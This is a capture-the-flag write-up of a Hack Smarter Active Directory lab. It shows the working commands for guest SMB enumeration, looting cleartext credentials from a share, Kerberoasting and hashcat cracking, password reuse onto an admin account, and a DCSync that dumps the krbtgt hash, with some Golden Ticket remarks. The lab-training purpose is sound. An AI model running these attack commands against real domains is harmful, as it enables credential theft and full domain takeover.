Hack Smarter · Easy · Active Directory

A textbook easy-AD chain, black-box from a VPN with no credentials: anonymous guest SMB -> cleartext creds in a readable share -> Kerberoast -> crack a service account -> password reuse onto a tier-0 admin -> DCSync the krbtgt hash. The objective is the KRBTGT NT hash, which only falls out of DCSync once you control a principal with replication rights — so the real work is the foothold-to-DA path; the hash is one command at the end.

Scenario: “Martini Bars”, an adult-beverage company, wants an internal black-box pentest of a branch office. Domain DRY.MARTINI.BARS, DC DC01. Hack Smarter reissues the target IP on redeploy — substitute your own for 10.1.159.245 below.

$ recon

nmap -Pn -sCV -p- 10.1.159.245

The usual DC fingerprint comes back — 53, 88, 389, 445, 636, 3268, 5985 — on Windows Server 2025 (Build 26100). Port 88 confirms a KDC; 5985 (WinRM) is a likely shell later. Add the host to /etc/hosts now, because Kerberos needs name resolution and skipping this bites you two steps down: 

echo '10.1.159.245  DC01.DRY.MARTINI.BARS DRY.MARTINI.BARS DC01' | sudo tee -a /etc/hosts

$ foothold — guest to a readable share

Guest authenticates, and there's a non-default notes share: 

nxc smb 10.1.159.245 -u guest -p '' --shares
# notes    READ,WRITE
# IPC$     READ

The IPC$ read lets us enumerate users by RID: 

nxc smb 10.1.159.245 -u guest -p '' --rid-brute
# Administrator, Guest, krbtgt, DC01$, mprice, athena.t0, ATHENA_SVC

Note the pair already: ATHENA_SVC (a service account) and athena.t0 (a “tier-0” / admin-looking account). That naming similarity is the escalation hint — hold onto it. Now loot the share: 

impacket-smbclient guest:''@10.1.159.245
# shares  ->  use notes  ->  get notes.txt

cat notes.txt
# - Order more gin for lakeside
# - Look for an engagement ring
# creds
# mprice:*martini*

A to-do list with a creds line at the bottom — mprice's password in cleartext. Verify it: 

nxc smb 10.1.159.245 -u mprice -p '*martini*'
# [+] DRY.MARTINI.BARS\mprice:*martini*

$ kerberoasting — mprice to ATHENA_SVC

With any valid domain user we can request service tickets for SPN-bearing accounts and crack them offline: 

nxc ldap 10.1.159.245 -u mprice -p '*martini*' --kerberoast kerberoastables.txt

This pulls an etype-23 TGS-REP for ATHENA_SVC (LDAP also reveals it sits in Remote Management Users and Remote Desktop Users — a WinRM shell, if you want one). Service accounts with human-set passwords crack fast: 

hashcat -m 13100 -a 0 kerberoastables.txt /usr/share/wordlists/rockyou.txt
# ...ATHENA_SVC... : 1dirtymartini      (cracked in ~2 seconds)

$ escalation — password reuse

This is the whole escalation: athena.t0 reuses ATHENA_SVC's password. 

nxc smb 10.1.159.245 -u athena.t0 -p '1dirtymartini'
# [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)

(Pwn3d!) = local admin on the DC. Game over for the domain.

$ objective — DCSync the krbtgt hash

With replication rights on the DC, pull the objective via DRSUAPI: 

impacket-secretsdump 'DRY.MARTINI.BARS/athena.t0:1dirtymartini@10.1.159.245' -just-dc-user krbtgt
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::

The fourth colon-field (after the aad3b4... LM placeholder) is the KRBTGT NT hash — the answer. secretsdump also grabs the AES256/AES128 Kerberos keys, which is what you'd forge a modern Golden Ticket with, since RC4/etype-23 is increasingly disabled.

$ flag

22ebc290e67668629c8d0812662a9c51   # KRBTGT NT hash

$ gotchas

  • One lab VPN at a time. With several Hack Smarter tunnels connected at once, they came up on overlapping 10.200.0.0/16 ranges and the route to the target subnet got claimed by the wrong tun interface — traffic black-holed and every tool timed out silently. sudo pkill openvpn, reconnect only this lab, and confirm ip route | grep 10.1 points at the single active tunnel.
  • /etc/hosts is mandatory for Kerberoasting. Without the realm -> IP mapping, the KDC lookup fails with Name or service not known on :88 and no ticket is written (hashcat then reports “No hashes loaded”).
  • NetExec's SMB path is flaky on this box (NetBIOSTimeout after a successful auth). Auth still succeeds; the enumeration just drops. Kerberoasting runs over LDAP/88 and behaves fine.
  • pyOpenSSL vs cryptography mismatch broke impacket-secretsdump with AttributeError: module 'lib' has no attribute 'GEN_EMAIL'. Fix: pip install --break-system-packages --upgrade pyopenssl cryptography.

$ takeaway

Nothing here is exotic — it's the bread and butter of easy AD: guest access is real access, cleartext secrets live in file shares, service-account passwords are crackable, and password reuse across a service account and its matching admin is the shortest path to Domain Admin. The naming convention told the whole story before the first ticket was ever requested.
